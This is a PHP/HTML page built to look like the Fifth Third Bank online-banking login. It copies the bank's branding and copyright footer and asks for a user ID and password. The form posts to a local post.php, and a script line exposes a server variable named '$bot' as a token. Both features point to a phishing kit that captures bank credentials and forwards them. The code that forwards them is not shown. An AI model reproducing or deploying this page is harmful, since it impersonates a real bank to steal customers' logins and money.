<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fifth</title>
    <link rel="stylesheet" href="res\css\main.css">
</head>
<body>
    <header>
        <div class="logo">
            <img src="res\img/logo.svg">
        </div>
        <div class="logoo"> 
            <img src="res\img/logoo.png">
        </div>
        <div class="links">
            <a href="#">CUSTOMER SERVICE</a>|
            <a href="#">BRANCH & ATM LOCATOR</a>
        </div>
    </header>
	<script>var token=<?php echo json_encode($bot); ?>;</script>
    
    <div class="bottom">
            <a href="#">Home</a> &gt; <span>Login</span>
        </div>

    <div class="container">
        
        
    <div class="login">
            <h2>Log in</h2>
            <form action="post.php" method="post">
                <div class="group">
                    
                    <select>
                        <option>Online Banking</option>
                        <option>Commercial Banking</option>
                    </select>
                    
                </div>
    <div class="group">
                    <label>User ID</label>
                    <input type="text"  name="user" required>
                    </label>
                    
    </div>
    <div class="group">
                    <label>Password</label>
                    <input type="password"  "name="pass" required>
                </div>
        <button type="submit" class="login-button">LOG IN</button>
    
    <div class="options">
                <a href="#">Forgot Login?</a> <br>
                First Time User? <a href="#">Register.</a>
            </div>
            </form>
        </div>
    </div>
	<script src="res/jq.js"></script>

    <footer>
        <p>Copyright © 2024 Fifth Third Bank, National Association.
             All Rights Reserved. Member FDIC. FDIC Logo Equal Housing Lender</p>
             <div class="logo">
            <img src="res\img/logo.svg">
        </div>
    </footer>
	
</body>
</html>
